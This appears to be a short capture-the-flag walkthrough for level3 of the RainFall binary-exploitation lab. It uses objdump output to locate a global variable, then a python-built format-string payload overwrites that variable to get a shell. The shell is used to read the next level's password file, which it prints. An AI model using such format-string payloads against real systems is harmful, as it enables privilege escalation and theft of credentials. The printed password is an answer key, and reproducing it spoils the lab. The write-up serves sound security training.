find the adress of m 
```
level3@RainFall:~$ objdump -t ./level3 

./level3:     file format elf32-i386

SYMBOL TABLE:
08048134 l    d  .interp        00000000              .interp
08048148 l    d  .note.ABI-tag  00000000              .note.ABI-tag
08048168 l    d  .note.gnu.build-id     00000000              .note.gnu.build-id
0804818c l    d  .gnu.hash      00000000              .gnu.hash
080481b8 l    d  .dynsym        00000000              .dynsym
08048258 l    d  .dynstr        00000000              .dynstr
080482c6 l    d  .gnu.version   00000000              .gnu.version
080482dc l    d  .gnu.version_r 00000000              .gnu.version_r
080482fc l    d  .rel.dyn       00000000              .rel.dyn
08048314 l    d  .rel.plt       00000000              .rel.plt
08048344 l    d  .init  00000000              .init
08048380 l    d  .plt   00000000              .plt
080483f0 l    d  .text  00000000              .text
080485dc l    d  .fini  00000000              .fini
080485f8 l    d  .rodata        00000000              .rodata
08048618 l    d  .eh_frame_hdr  00000000              .eh_frame_hdr
08048654 l    d  .eh_frame      00000000              .eh_frame
08049738 l    d  .ctors 00000000              .ctors
08049740 l    d  .dtors 00000000              .dtors
08049748 l    d  .jcr   00000000              .jcr
0804974c l    d  .dynamic       00000000              .dynamic
08049814 l    d  .got   00000000              .got
08049818 l    d  .got.plt       00000000              .got.plt
0804983c l    d  .data  00000000              .data
08049860 l    d  .bss   00000000              .bss
00000000 l    d  .comment       00000000              .comment
00000000 l    df *ABS*  00000000              crtstuff.c
08049738 l     O .ctors 00000000              __CTOR_LIST__
08049740 l     O .dtors 00000000              __DTOR_LIST__
08049748 l     O .jcr   00000000              __JCR_LIST__
08048420 l     F .text  00000000              __do_global_dtors_aux
08049884 l     O .bss   00000001              completed.6159
08049888 l     O .bss   00000004              dtor_idx.6161
08048480 l     F .text  00000000              frame_dummy
00000000 l    df *ABS*  00000000              crtstuff.c
0804973c l     O .ctors 00000000              __CTOR_END__
08048734 l     O .eh_frame      00000000              __FRAME_END__
08049748 l     O .jcr   00000000              __JCR_END__
080485b0 l     F .text  00000000              __do_global_ctors_aux
00000000 l    df *ABS*  00000000              level3.c
08049738 l       .ctors 00000000              __init_array_end
0804974c l     O .dynamic       00000000              _DYNAMIC
08049738 l       .ctors 00000000              __init_array_start
08049818 l     O .got.plt       00000000              _GLOBAL_OFFSET_TABLE_
080485a0 g     F .text  00000002              __libc_csu_fini
080485a2 g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
0804983c  w      .data  00000000              data_start
00000000       F *UND*  00000000              printf@@GLIBC_2.0
00000000       F *UND*  00000000              fgets@@GLIBC_2.0
08049844 g       *ABS*  00000000              _edata
080484a4 g     F .text  00000076              v
080485dc g     F .fini  00000000              _fini
00000000       F *UND*  00000000              fwrite@@GLIBC_2.0
08049744 g     O .dtors 00000000              .hidden __DTOR_END__
0804983c g       .data  00000000              __data_start
00000000       F *UND*  00000000              system@@GLIBC_2.0
00000000  w      *UND*  00000000              __gmon_start__
08049840 g     O .data  00000000              .hidden __dso_handle
080485fc g     O .rodata        00000004              _IO_stdin_used
00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
08048530 g     F .text  00000061              __libc_csu_init
08049860 g     O .bss   00000004              stdin@@GLIBC_2.0
08049890 g       *ABS*  00000000              _end
080483f0 g     F .text  00000000              _start
080485f8 g     O .rodata        00000004              _fp_hw
0804988c g     O .bss   00000004              m
08049880 g     O .bss   00000004              stdout@@GLIBC_2.0
08049844 g       *ABS*  00000000              __bss_start
0804851a g     F .text  0000000d              main
00000000  w      *UND*  00000000              _Jv_RegisterClasses
08048344 g     F .init  00000000              _init
```

```
    python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' > /tmp/hh
```

```
    level3@RainFall:~$ (cat /tmp/hh; cat) | ./level3
    �                                                           
    Wait what?!
    whoami
    level4
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```